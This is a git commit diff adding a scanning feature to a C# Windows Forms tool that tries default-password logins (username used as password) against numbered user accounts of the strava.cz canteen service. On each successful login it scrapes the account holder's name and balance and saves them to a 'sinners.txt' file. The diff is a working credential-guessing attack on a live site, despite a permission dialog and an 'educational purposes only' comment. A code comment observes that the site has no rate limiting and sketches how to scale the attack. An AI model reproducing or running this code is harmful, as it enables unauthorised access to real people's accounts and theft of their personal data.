b29b212b9a0281f6080f031b318c557c597a863d
Tomáš Diblík <dibla.tomas@post.cz>
2023-01-28 10:46:06 +0100

    [Feature] Implement scanning
    I have made and used demo account while testing. I have not tested this on anything else but my demo account.

--- src/MainForm.Designer.cs
+++ src/MainForm.Designer.cs
@@ -32,6 +32,17 @@
             this.label1 = new System.Windows.Forms.Label();
             this.RefreshCanteensButton = new System.Windows.Forms.Button();
             this.label2 = new System.Windows.Forms.Label();
+            this.StartingNumberSelector = new System.Windows.Forms.NumericUpDown();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.FinalNumberSelector = new System.Windows.Forms.NumericUpDown();
+            this.ExecuteButton = new System.Windows.Forms.Button();
+            this.LogViewer = new System.Windows.Forms.RichTextBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.ExecutionProgress = new System.Windows.Forms.ProgressBar();
+            this.ShouldSaveAccountsWithDefaultPassword = new System.Windows.Forms.CheckBox();
+            ((System.ComponentModel.ISupportInitialize)(this.StartingNumberSelector)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.FinalNumberSelector)).BeginInit();
             this.SuspendLayout();
             // 
             // CanteenList
@@ -39,7 +50,7 @@
             this.CanteenList.FormattingEnabled = true;
             this.CanteenList.Location = new System.Drawing.Point(12, 39);
             this.CanteenList.Name = "CanteenList";
-            this.CanteenList.Size = new System.Drawing.Size(423, 184);
+            this.CanteenList.Size = new System.Drawing.Size(480, 184);
             this.CanteenList.TabIndex = 0;
             // 
             // label1
@@ -53,7 +64,7 @@
             // 
             // RefreshCanteensButton
             // 
-            this.RefreshCanteensButton.Location = new System.Drawing.Point(344, 5);
+            this.RefreshCanteensButton.Location = new System.Drawing.Point(401, 5);
             this.RefreshCanteensButton.Name = "RefreshCanteensButton";
             this.RefreshCanteensButton.Size = new System.Drawing.Size(91, 23);
             this.RefreshCanteensButton.TabIndex = 2;
@@ -70,11 +81,107 @@
             this.label2.TabIndex = 3;
             this.label2.Text = "(check canteens you want to test agains)";
             // 
+            // StartingNumberSelector
+            // 
+            this.StartingNumberSelector.Location = new System.Drawing.Point(12, 277);
+            this.StartingNumberSelector.Maximum = new decimal(new int[] {
+            9999999,
+            0,
+            0,
+            0});
+            this.StartingNumberSelector.Name = "StartingNumberSelector";
+            this.StartingNumberSelector.Size = new System.Drawing.Size(108, 23);
+            this.StartingNumberSelector.TabIndex = 4;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(12, 259);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(108, 15);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Start from number:";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(142, 259);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(112, 15);
+            this.label4.TabIndex = 7;
+            this.label4.Text = "Finish with number:";
+            // 
+            // FinalNumberSelector
+            // 
+            this.FinalNumberSelector.Location = new System.Drawing.Point(142, 277);
+            this.FinalNumberSelector.Maximum = new decimal(new int[] {
+            9999999,
+            0,
+            0,
+            0});
+            this.FinalNumberSelector.Name = "FinalNumberSelector";
+            this.FinalNumberSelector.Size = new System.Drawing.Size(108, 23);
+            this.FinalNumberSelector.TabIndex = 6;
+            // 
+            // ExecuteButton
+            // 
+            this.ExecuteButton.Location = new System.Drawing.Point(12, 317);
+            this.ExecuteButton.Name = "ExecuteButton";
+            this.ExecuteButton.Size = new System.Drawing.Size(480, 32);
+            this.ExecuteButton.TabIndex = 8;
+            this.ExecuteButton.Text = "Execute";
+            this.ExecuteButton.UseVisualStyleBackColor = true;
+            this.ExecuteButton.Click += new System.EventHandler(this.ExecuteButton_Click);
+            // 
+            // LogViewer
+            // 
+            this.LogViewer.Location = new System.Drawing.Point(12, 418);
+            this.LogViewer.Name = "LogViewer";
+            this.LogViewer.Size = new System.Drawing.Size(480, 231);
+            this.LogViewer.TabIndex = 9;
+            this.LogViewer.Text = "";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(12, 400);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(30, 15);
+            this.label5.TabIndex = 10;
+            this.label5.Text = "Log:";
+            // 
+            // ExecutionProgress
+            // 
+            this.ExecutionProgress.Location = new System.Drawing.Point(12, 355);
+            this.ExecutionProgress.Name = "ExecutionProgress";
+            this.ExecutionProgress.Size = new System.Drawing.Size(480, 23);
+            this.ExecutionProgress.Step = 1;
+            this.ExecutionProgress.TabIndex = 11;
+            // 
+            // ShouldSaveAccountsWithDefaultPassword
+            // 
+            this.ShouldSaveAccountsWithDefaultPassword.AutoSize = true;
+            this.ShouldSaveAccountsWithDefaultPassword.Location = new System.Drawing.Point(267, 278);
+            this.ShouldSaveAccountsWithDefaultPassword.Name = "ShouldSaveAccountsWithDefaultPassword";
+            this.ShouldSaveAccountsWithDefaultPassword.Size = new System.Drawing.Size(225, 19);
+            this.ShouldSaveAccountsWithDefaultPassword.TabIndex = 12;
+            this.ShouldSaveAccountsWithDefaultPassword.Text = "Save accounts with default passwords";
+            this.ShouldSaveAccountsWithDefaultPassword.UseVisualStyleBackColor = true;
+            // 
             // MainForm
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(447, 450);
+            this.ClientSize = new System.Drawing.Size(512, 661);
+            this.Controls.Add(this.ShouldSaveAccountsWithDefaultPassword);
+            this.Controls.Add(this.ExecutionProgress);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.LogViewer);
+            this.Controls.Add(this.ExecuteButton);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.FinalNumberSelector);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.StartingNumberSelector);
             this.Controls.Add(this.label2);
             this.Controls.Add(this.RefreshCanteensButton);
             this.Controls.Add(this.label1);
@@ -83,6 +190,8 @@
             this.Name = "MainForm";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
             this.Text = "Proof of concept";
+            ((System.ComponentModel.ISupportInitialize)(this.StartingNumberSelector)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.FinalNumberSelector)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -94,5 +203,14 @@
         private Label label1;
         private Button RefreshCanteensButton;
         private Label label2;
+        private NumericUpDown StartingNumberSelector;
+        private Label label3;
+        private Label label4;
+        private NumericUpDown FinalNumberSelector;
+        private Button ExecuteButton;
+        private RichTextBox LogViewer;
+        private Label label5;
+        private ProgressBar ExecutionProgress;
+        private CheckBox ShouldSaveAccountsWithDefaultPassword;
     }
 }
--- src/MainForm.cs
+++ src/MainForm.cs
@@ -1,15 +1,16 @@
 using HtmlAgilityPack;
 using RestSharp;
 using System.Web;
-using System.Xml;
 
 namespace strava_cz_bruteforce_default_login
 {
     public partial class MainForm : Form
     {
         private const string canteen_list_url = "https://www.strava.cz/Strava/Stravnik/Zarizeni";
+        private const string user_login_url = "https://www.strava.cz/Strava/Stravnik/Prihlaseni";
 
-        private const string canteens_savefile_name = "canteens.txt";
+        private string canteens_savefile_name = Path.Combine(System.AppDomain.CurrentDomain.BaseDirectory, "canteens.txt");
+        private string output_file_name = Path.Combine(System.AppDomain.CurrentDomain.BaseDirectory, "sinners.txt");
         private const string canteen_id_name_separator = ";-=-;";
 
         public MainForm()
@@ -23,12 +24,14 @@ namespace strava_cz_bruteforce_default_login
         }
 
         private static string xpath_div_contains_class(string class_name) => $".//div[contains(concat(' ', normalize-space(@class), ' '), ' {class_name} ')]";
+        private static string xpath_span_contains_class(string class_name) => $".//span[contains(concat(' ', normalize-space(@class), ' '), ' {class_name} ')]";
         private static string decode_html_chars(string html_decoded_string)
         {
             StringWriter temp_writer = new StringWriter();
             HttpUtility.HtmlDecode(html_decoded_string, temp_writer);
             return temp_writer.ToString();
         }
+
         private async void RefreshCanteensButton_Click(object sender, EventArgs e)
         {
             RestClient client = new RestClient(canteen_list_url);
@@ -51,6 +54,7 @@ namespace strava_cz_bruteforce_default_login
                 File.Delete(canteens_savefile_name);
             }
             await File.WriteAllLinesAsync(canteens_savefile_name, canteens_save_formatted);
+
             load_canteens_from_savefile();
         }
 
@@ -67,12 +71,89 @@ namespace strava_cz_bruteforce_default_login
             foreach (string available_canteen in available_canteens) {
                 string[] canteen_info = available_canteen.Split(canteen_id_name_separator);
                 available_canteens_formatted.Add( new CanteenListItem() {
-                    Id = canteen_info[0],
-                    Name = canteen_info[1]
+                    Id = canteen_info[0].Trim(),
+                    Name = canteen_info[1].Trim()
                 });
             }
 
             CanteenList.Items.AddRange(available_canteens_formatted.OrderBy(s => s.Id).ToArray());
+        }
+
+        private void log_line(string line) => LogViewer.Text += line + Environment.NewLine;
+        private async void ExecuteButton_Click(object sender, EventArgs e)
+        {
+            int starting_number = (int)StartingNumberSelector.Value;
+            int final_number = (int)FinalNumberSelector.Value;
+            if (MessageBox.Show($"Are you sure you obtained permission from users in range: {starting_number} - {final_number}", "Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) {
+                MessageBox.Show("Before proceeding, obtain a permission from ALL AFFECTED USERS.");
+                return;
+            }
+            if (CanteenList.CheckedItems.Count == 0) {
+                MessageBox.Show("At least one canteen has to be checked.");
+                return;
+            }
+            if (final_number < starting_number) {
+                MessageBox.Show("Enter a valid range.");
+                return;
+            }
+
+            LogViewer.Clear();
+            ExecutionProgress.Value = 0;
+            // first +1 because the range is inclusive ; second +1 because I want to be able to call PerformStep after both loops
+            ExecutionProgress.Maximum = ( (final_number - starting_number + 1) * CanteenList.CheckedItems.Count) + 1;
+
+            if (ShouldSaveAccountsWithDefaultPassword.Checked && File.Exists(output_file_name)) {
+                File.Delete(output_file_name);
+            }
+
+            // Somebody could theoretically make this run multiple tasks on multiple cors and scale really well - at time ([r * k] / [t * c]) - r => number_of_requests ; k => request response time ; t => tasks spawned ; c => cores used,
+            // however since this project is for educational purposes only, so I am NOT going to implement that.
+            // Nonetheless that approach should be currentlly possible to implement, because AFAIK strava does not rate limit requests
+            IEnumerable<CanteenListItem> checked_canteens = CanteenList.CheckedItems.Cast<CanteenListItem>();
+            foreach (CanteenListItem canteen in checked_canteens) {
+                List<string> list_of_accounts_with_default_passwords = new List<string>();
+                for (int i = starting_number; i <= final_number; i++) {
+                    ExecutionProgress.PerformStep();
+                    (bool could_login, HtmlAgilityPack.HtmlDocument response_page) = await send_login_attempt(canteen.Id, i.ToString());
+
+                    if (!could_login) {
+                        log_line($"{canteen.Id} - {i} does not have default password.");
+                        continue;
+                    }
+
+                    string username = decode_html_chars(response_page.DocumentNode.SelectSingleNode(xpath_span_contains_class("uzivatel-jmeno-hodnota")).InnerText);
+                    string overpay = decode_html_chars(response_page.DocumentNode.SelectSingleNode(xpath_span_contains_class("konto")).InnerText);
+
+                    string output_line = $"{canteen.Id} - {i} => {username} ; {overpay}";
+                    if (ShouldSaveAccountsWithDefaultPassword.Checked) {
+                        list_of_accounts_with_default_passwords.Add(output_line);
+                    }
+                    log_line(output_line);
+                }
+                File.WriteAllLines(output_file_name, list_of_accounts_with_default_passwords);
+            }
+            ExecutionProgress.PerformStep();
+        }
+
+        private static async Task<(bool, HtmlAgilityPack.HtmlDocument)> send_login_attempt(string canteen, string username)
+        {
+            RestClient client = new RestClient(user_login_url);
+            RestRequest request = new RestRequest("", Method.Post);
+            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            request.AddParameter("zarizeni", canteen);
+            request.AddParameter("uzivatel", username);
+            request.AddParameter("heslo", username);
+
+            RestResponse response = await client.ExecuteAsync(request);
+
+            HtmlAgilityPack.HtmlDocument html_doc = new HtmlAgilityPack.HtmlDocument();
+            html_doc.LoadHtml(response.Content);
+
+            // Unreliable way to test if user has an account, but it's good enought for now
+            // It would be better to test for response code, however strava.cz always returns 200 at this moment
+            HtmlNode? failed_login_node = html_doc.DocumentNode.SelectSingleNode("//div[@id='prihlaseni_neuspech']");
+            return (failed_login_node == null, html_doc);
         }
     }
 }
